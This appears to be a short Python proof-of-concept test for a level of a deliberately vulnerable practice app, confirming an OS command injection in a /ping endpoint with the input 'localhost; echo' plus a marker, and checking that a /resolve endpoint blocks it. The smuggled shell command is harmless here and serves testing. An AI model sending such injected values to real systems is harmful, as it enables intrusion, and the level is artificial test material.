"""L02 OS command injection PoC.

/ping builds the shell command by string-formatting `host` with shell=True.
A shell metacharacter in `host` runs an extra command.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _common import load_level, ok

mod, _, _ = load_level("L02")
client = mod.app.test_client()

marker = "INJECTED_L02_MARKER"
res = client.get("/ping", query_string={"host": f"localhost; echo {marker}"}).get_json()
ok(marker in (res.get("stdout") or ""), "injected echo executed via /ping host param")

# decoy: /resolve rejects metacharacters and uses argv form
bad = client.get("/resolve", query_string={"name": "localhost; echo x"})
ok(bad.status_code == 400, "/resolve hostname validation blocks the decoy")
print("L02 exploit confirmed")
